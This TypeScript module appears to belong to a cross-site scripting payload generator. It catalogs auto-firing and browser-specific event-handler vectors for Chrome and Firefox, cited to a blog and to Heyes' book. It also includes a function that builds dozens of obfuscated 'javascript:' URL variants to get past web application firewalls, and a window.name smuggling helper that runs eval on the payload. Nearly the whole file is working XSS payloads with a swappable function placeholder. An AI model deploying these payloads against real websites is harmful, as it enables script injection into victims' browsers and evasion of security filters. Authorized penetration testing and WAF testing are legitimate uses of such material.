/**
 * Rotor 5: Execution — Auto-fire events, browser-specific vectors.
 *
 * "The final rotor determines how the JavaScript fires.  This matters because
 * many WAFs block common event handlers like onerror or onload, and many
 * modern payloads need to fire without user interaction (auto-fire)."
 *
 * The cascade goes from universally-supported events down to browser-specific
 * and interaction-requiring ones.
 *
 * Browser-specific notes from the blog:
 *  - Chrome: popover API on type=hidden inputs; outline CSS transition trick
 *  - Firefox: onafterscriptexecute; self-closing SVG script with href
 *  - SVG: entity decoding inside <script> tags (&#97;lert → alert)
 */

export interface ExecutorCandidate {
  name: string;
  mode: "auto" | "interaction" | "browser_specific";
  payload: string;
  browser?: "chrome" | "firefox" | "any";
}

export const EXECUTION_CASCADE: ExecutorCandidate[] = [
  // ── Auto-fire: universally supported ────────────────────────────────
  { name: "img_onerror", mode: "auto", payload: "<img src=x onerror=alert(1)>", browser: "any" },
  { name: "svg_onload", mode: "auto", payload: "<svg onload=alert(1)>", browser: "any" },
  { name: "details_ontoggle", mode: "auto", payload: "<details open ontoggle=alert(1)>", browser: "any" },
  { name: "input_onfocus", mode: "auto", payload: "<input onfocus=alert(1) autofocus>", browser: "any" },
  { name: "animate_onbegin", mode: "auto", payload: "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", browser: "any" },
  { name: "animationstart", mode: "auto", payload: '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart=alert(1)>', browser: "any" },

  // ── Browser-specific auto-fire ──────────────────────────────────────
  {
    name: "popover",
    mode: "browser_specific",
    payload: "<button popovertarget=x>go</button><div id=x popover onbeforetoggle=alert(1)>",
    browser: "chrome"
  },
  {
    name: "transitionend",
    mode: "browser_specific",
    payload: '<input style="transition:outline 1s" ontransitionend=alert(1) autofocus>',
    browser: "chrome"
  },
  {
    name: "hidden_popover",
    mode: "browser_specific",
    payload: '<input type=hidden value="" popover onbeforetoggle=alert(1)>',
    browser: "chrome"
  },
  {
    name: "svg_entity_script",
    mode: "browser_specific",
    payload: "<svg><script>&#97;lert(1)</script></svg>",
    browser: "any"
  },
  {
    name: "onafterscriptexecute",
    mode: "browser_specific",
    payload: "<script>1</script><img onafterscriptexecute=alert(1)>",
    browser: "firefox"
  },
  {
    name: "firefox_svg_script_href",
    mode: "browser_specific",
    payload: '<svg><script href="data:,alert(1)"/></svg>',
    browser: "firefox"
  },

  // ── Scroll-based auto-fire ───────────────────────────────────────────
  {
    name: "scrollend",
    mode: "auto",
    payload: '<div style="overflow:auto;height:1px" onscrollend=alert(1)><div style="height:2px"></div></div>',
    browser: "any"
  },
  {
    name: "wheel_scroll",
    mode: "auto",
    payload: '<div style="overflow:auto;height:1px" onwheel=alert(1)><div style="height:2px"></div></div>',
    browser: "any"
  },

  // ── Heyes Ch.8 additional auto-fire vectors ───────────────────────────
  // onunhandledrejection — fires auto in Firefox when a Promise rejects at
  //   top level without a .catch() handler. Heyes book L2339 (Firefox).
  {
    name: "onunhandledrejection",
    mode: "browser_specific",
    payload: "<body onunhandledrejection=alert(1)><script>fetch('//invalid.invalid')</script>",
    browser: "firefox"
  },
  // onpopstate via iframe + src+='#' — auto-fires without user gesture.
  //   Heyes book L2354-2359. Uses postMessage to stay same-document while
  //   a hashchange triggers popstate. Useful when onerror/onload are blocked.
  {
    name: "onpopstate_iframe",
    mode: "auto",
    payload: "<iframe src=javascript:1 onload=alert(1)><!-- onpopstate variant: body onpopstate=alert(1) --><script>location.hash=1</script>",
    browser: "any"
  },
  // onhashchange — auto-fires via same iframe hash manipulation. L2356-2363.
  {
    name: "onhashchange_iframe",
    mode: "auto",
    payload: '<body onhashchange=alert(1)><iframe src="about:blank" onload=this.src%2b="%23">',
    browser: "any"
  },
  // onmessage — auto-fires on receiving a postMessage. L2363.
  {
    name: "onmessage_iframe",
    mode: "auto",
    payload: '<body onmessage=alert(1)><iframe src=about:blank onload=this.contentWindow.postMessage("x","*")>',
    browser: "any"
  },
  // onfocusin — WAF-bypass twin of onfocus (L2378). Auto-fires with autofocus
  //   on browsers that support the focusin event (Chrome/Edge).
  {
    name: "onfocusin_autofocus",
    mode: "auto",
    payload: "<input onfocusin=alert(1) autofocus>",
    browser: "any"
  },
  // ontransitioncancel — L2384. Fires on transition abort (CSS escapes).
  {
    name: "ontransitioncancel",
    mode: "browser_specific",
    payload: '<xss id=x style="transition:color 10s" ontransitioncancel=print()>',
    browser: "chrome"
  },
  // onwebkittransitionend — legacy WebKit/Blink variant of transitionend. L2395.
  {
    name: "onwebkittransitionend",
    mode: "browser_specific",
    payload: '<xss id=x style="transition:outline 1s" onwebkittransitionend=alert(1) tabindex=1>',
    browser: "chrome"
  },
  // onbeforescriptexecute — Firefox twin of onafterscriptexecute. L2331.
  {
    name: "onbeforescriptexecute",
    mode: "browser_specific",
    payload: "<img onbeforescriptexecute=alert(1)><script>1</script>",
    browser: "firefox"
  },
  // animate onend — Heyes book L2347. Fires when SVG animation ends.
  {
    name: "animate_onend",
    mode: "auto",
    payload: "<svg><animate onend=alert(1) attributeName=x dur=1s>",
    browser: "any"
  },

  // ── Interaction-required ────────────────────────────────────────────
  { name: "onclick", mode: "interaction", payload: "<button onclick=alert(1)>go</button>", browser: "any" },
  { name: "onmouseover", mode: "interaction", payload: "<xss onmouseover=alert(1)>hover</xss>", browser: "any" },
  { name: "accesskey", mode: "interaction", payload: "<input accesskey=x onclick=alert(1)>", browser: "any" },
  { name: "ontransitionrun", mode: "interaction", payload: '<div style="transition:1s" ontransitionrun=alert(1)>x</div>', browser: "any" }
];

/**
 * Generates 43+ variants of `javascript:` URLs using separator chars
 * that browsers accept but WAFs often miss between scheme and colon.
 */
export function generateJavaScriptUrlVariants(func: string): string[] {
  const separators: Record<string, string[]> = {
    raw: ["\t", "\n", "\r", "\x0c", "\x0b", "\0"],
    urlEnc: ["%09", "%0a", "%0d", "%0c", "%0b", "%00"],
    htmlDec: ["&#9;", "&#10;", "&#13;", "&#12;", "&#11;"],
    htmlHex: ["&#x9;", "&#xa;", "&#xd;", "&#xc;", "&#xb;"],
  };

  // Positions within "javascript" to insert separators (0-indexed split points)
  const word = "javascript";
  const splitPoints = [4, 6, 8]; // java|script, javasc|ript, javascri|pt

  const variants: string[] = [];

  // Raw separator at each split point
  for (const sep of separators.raw) {
    for (const sp of splitPoints) {
      variants.push(word.slice(0, sp) + sep + word.slice(sp) + ":" + func);
    }
  }

  // URL-encoded variants at position 4
  for (const enc of separators.urlEnc) {
    variants.push("java" + enc + "script:" + func);
  }

  // HTML decimal-encoded at position 4
  for (const enc of separators.htmlDec) {
    variants.push("java" + enc + "script:" + func);
  }

  // HTML hex-encoded at position 4
  for (const enc of separators.htmlHex) {
    variants.push("java" + enc + "script:" + func);
  }

  // Mixed case variants
  const casings = ["JaVaScRiPt", "JAVASCRIPT", "jAvAsCrIpT"];
  for (const c of casings) {
    variants.push(c + ":" + func);
  }

  // Mixed case + raw separator
  for (const c of casings) {
    variants.push(c.slice(0, 4) + "\t" + c.slice(4) + ":" + func);
  }

  // Multiple separator chars
  variants.push("java\t\nscript:" + func);
  variants.push("java\n\rscript:" + func);
  variants.push("java\r\t\nscript:" + func);

  // Leading/trailing whitespace
  variants.push(" javascript:" + func);
  variants.push("\tjavascript:" + func);
  variants.push("\njavascript:" + func);
  variants.push("javascript :" + func);

  return variants;
}

/** Scroll-based execution vector — fires without user interaction on overflow. */
export function toScrollEndPayload(): string {
  return '<div style="overflow:auto;height:1px" onscrollend=alert(1)><div style="height:2px"></div></div>'
    + '\n<!-- wheel variant -->\n'
    + '<div style="overflow:auto;height:1px" onwheel=alert(1)><div style="height:2px"></div></div>';
}

/** Data smuggling via window.name — payload survives cross-origin navigations. */
export function toWindowNameSmuggle(func: string): string {
  return `<script>window.name="${func}";location="//victim"</script>`
    + `<!-- receiver: <script>eval(name)</script> -->`;
}

/** Details/summary toggle — auto-fires via open attribute. */
export function toDetailsToggle(func: string): string {
  return `<details open ontoggle=${func}><summary>x</summary></details>`;
}

/** Chrome popover API vector. */
export function toPopoverPayload(func: string): string {
  return `<button popovertarget=x>go</button><div id=x popover onbeforetoggle=${func}>`;
}

/** Firefox onafterscriptexecute auto-fire. */
export function toFirefoxScriptEvent(func: string): string {
  return `<script>1</script><img onafterscriptexecute=${func}>`;
}

/** SVG animate onbegin — fires when animation starts. */
export function toSvgAnimateBegin(func: string): string {
  return `<svg><animate onbegin=${func} attributeName=x dur=1s>`;
}
